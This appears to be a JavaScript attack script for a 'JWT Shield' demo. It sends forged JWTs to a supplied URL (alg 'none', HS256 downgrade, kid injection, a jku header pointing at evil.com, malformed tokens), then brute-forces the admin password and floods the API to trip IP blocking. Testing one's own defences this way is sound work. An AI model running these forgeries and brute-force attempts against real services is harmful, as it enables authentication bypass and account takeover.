/**
 * ╔═══════════════════════════════════════════════════════════════╗
 * ║      JWT SHIELD — Remote Attack Script                       ║
 * ║  Run this from ANOTHER laptop to test cross-network attacks  ║
 * ╚═══════════════════════════════════════════════════════════════╝
 *
 * Usage:
 *   node remote_attacker.js https://YOUR-NGROK-URL.ngrok-free.app
 *
 * Example:
 *   node remote_attacker.js https://entomb-chill-rug.ngrok-free.dev
 */

const API = process.argv[2];

if (!API) {
  console.error('\n  ❌  Please provide the ngrok URL as argument!');
  console.error('  Usage: node remote_attacker.js https://YOUR-URL.ngrok-free.app\n');
  process.exit(1);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ── Attack 1: None Algorithm Exploit ─────────────────────────────
async function attackNone() {
  console.log('\n🚫 Attack 1: None Algorithm Exploit');
  console.log('   Sending JWT with alg:"none" (unsigned token bypass)...');
  
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: 'hacker', exp: Math.floor(Date.now() / 1000) + 3600,
    iat: Math.floor(Date.now() / 1000), iss: 'jwt-shield-demo', aud: 'jwt-shield-api',
  })).toString('base64url');
  const token = `${header}.${payload}.`;

  const res = await fetch(`${API}/api/data`, {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
  });
  console.log(`   → HTTP ${res.status} — ${(await res.text()).slice(0, 100)}`);
}

// ── Attack 2: Algorithm Downgrade (HS256) ────────────────────────
async function attackDowngrade() {
  console.log('\n⬇️  Attack 2: Algorithm Downgrade (HS256)');
  console.log('   Sending JWT with alg:"HS256" instead of RS256...');

  const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: 'hacker', exp: Math.floor(Date.now() / 1000) + 3600,
    iat: Math.floor(Date.now() / 1000), iss: 'jwt-shield-demo', aud: 'jwt-shield-api',
  })).toString('base64url');
  const token = `${header}.${payload}.fakesignature`;

  const res = await fetch(`${API}/api/data`, {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
  });
  console.log(`   → HTTP ${res.status} — ${(await res.text()).slice(0, 100)}`);
}

// ── Attack 3: KID Injection ──────────────────────────────────────
async function attackKidInjection() {
  console.log('\n🔑 Attack 3: KID Injection (path traversal)');
  console.log('   Sending JWT with kid:"../../etc/passwd"...');

  const header = Buffer.from(JSON.stringify({
    alg: 'RS256', typ: 'JWT', kid: 'attacker-controlled-key'
  })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: 'admin', role: 'admin', exp: Math.floor(Date.now() / 1000) + 3600,
    iat: Math.floor(Date.now() / 1000), iss: 'jwt-shield-demo', aud: 'jwt-shield-api',
  })).toString('base64url');
  const token = `${header}.${payload}.bogussignature`;

  const res = await fetch(`${API}/api/data`, {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
  });
  console.log(`   → HTTP ${res.status} — ${(await res.text()).slice(0, 100)}`);
}

// ── Attack 4: Key Confusion (JWK embed) ─────────────────────────
async function attackKeyConfusion() {
  console.log('\n🔀 Attack 4: Key Confusion (embedded JWK)');
  console.log('   Sending JWT with jku:"https://evil.com/jwks.json"...');

  const header = Buffer.from(JSON.stringify({
    alg: 'RS256', typ: 'JWT', jku: 'https://evil.com/.well-known/jwks.json'
  })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: 'admin', exp: Math.floor(Date.now() / 1000) + 3600,
    iat: Math.floor(Date.now() / 1000),
  })).toString('base64url');
  const token = `${header}.${payload}.confused`;

  const res = await fetch(`${API}/api/data`, {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
  });
  console.log(`   → HTTP ${res.status} — ${(await res.text()).slice(0, 100)}`);
}

// ── Attack 5: Malformed Token ────────────────────────────────────
async function attackMalformed() {
  console.log('\n💀 Attack 5: Malformed Token');
  console.log('   Sending broken/garbage JWT...');

  const tokens = [
    'not.a.jwt.at.all',
    'abc.def.',
    '.....',
    Buffer.from('notjson').toString('base64url') + '.payload.sig',
  ];

  for (const token of tokens) {
    const res = await fetch(`${API}/api/data`, {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
    });
    console.log(`   → HTTP ${res.status} — ${(await res.text()).slice(0, 80)}`);
    await sleep(200);
  }
}

// ── Attack 6: Brute Force Login ──────────────────────────────────
async function attackBruteForce() {
  console.log('\n🔓 Attack 6: Login Brute Force');
  console.log('   Trying common passwords...');

  const passwords = ['admin', 'password', '123456', 'root', 'letmein', 'qwerty', 'abc123', 'monkey'];

  for (const pw of passwords) {
    const res = await fetch(`${API}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'admin', password: pw }),
    });
    const body = await res.text();
    console.log(`   pw="${pw.padEnd(10)}" → HTTP ${res.status} — ${body.slice(0, 60)}`);
    await sleep(300);
  }
}

// ── Attack 7: Request Flood (triggers IP block!) ─────────────────
async function attackFlood() {
  console.log('\n🌊 Attack 7: Request Flood (15 rapid requests)');
  console.log('   This should trigger IP auto-blocking after ~10 requests...\n');

  for (let i = 1; i <= 15; i++) {
    const res = await fetch(`${API}/api/data`, {
      method: 'POST',
      headers: { 'Authorization': 'Bearer garbage.token.here', 'Content-Type': 'application/json' },
    });
    const status = res.status;
    const icon = status === 403 ? (i >= 10 ? '⛔ IP BLOCKED' : '🛡️ BLOCKED') : `⚠️  ${status}`;
    console.log(`   #${String(i).padStart(2)} → HTTP ${status} — ${icon}`);
    await sleep(100);
  }
}

// ── Attack 8: Valid Request (to show accepted tokens) ────────────
async function validRequest() {
  console.log('\n✅ Valid Request: Login + Protected Route');
  console.log('   Logging in with correct credentials, then accessing protected data...');

  const loginRes = await fetch(`${API}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'demo', password: 'demo' }),
  });
  const loginBody = await loginRes.json();

  if (!loginBody.token) {
    console.log(`   → Login failed: ${JSON.stringify(loginBody)}`);
    return;
  }
  console.log(`   → Login OK — got token (expires in ${loginBody.expiresIn}s)`);

  const dataRes = await fetch(`${API}/api/data`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${loginBody.token}`,
      'Content-Type': 'application/json',
    },
  });
  const dataBody = await dataRes.text();
  console.log(`   → Protected route: HTTP ${dataRes.status} — ${dataBody.slice(0, 100)}`);
}

// ── Main ─────────────────────────────────────────────────────────
async function main() {
  console.log('');
  console.log('╔═══════════════════════════════════════════════════════════════╗');
  console.log('║     🔥  JWT SHIELD — Remote Attack Script  🔥               ║');
  console.log('╠═══════════════════════════════════════════════════════════════╣');
  console.log('║  Target: ' + API.padEnd(51) + '║');
  console.log('╚═══════════════════════════════════════════════════════════════╝');
  console.log('');

  // Check if API is reachable
  try {
    const health = await fetch(`${API}/health`);
    const body = await health.json();
    if (!body.ok) throw new Error('API not healthy');
    console.log('✅ API is reachable! Starting attacks...');
  } catch (e) {
    console.error(`❌ Cannot reach API at ${API}`);
    console.error(`   Error: ${e.message}`);
    console.error('   Make sure ngrok is running and the URL is correct.');
    process.exit(1);
  }

  console.log('═'.repeat(60));

  // Run attacks with pauses between them
  await validRequest();      await sleep(1500);
  await attackNone();        await sleep(1500);
  await attackDowngrade();   await sleep(1500);
  await attackKidInjection();await sleep(1500);
  await attackKeyConfusion();await sleep(1500);
  await attackMalformed();   await sleep(1500);
  await attackBruteForce();  await sleep(1500);
  await attackFlood();       // This one triggers IP block

  console.log('\n' + '═'.repeat(60));
  console.log('\n🏁 All attacks complete!');
  console.log('   Check the dashboard on the other laptop to see:');
  console.log('   • Your IP address in the IP Monitor (blocked!)');
  console.log('   • All attack types in the Attack Distribution chart');
  console.log('   • Live events in the Threat Feed');
  console.log('');
}

main().catch(console.error);
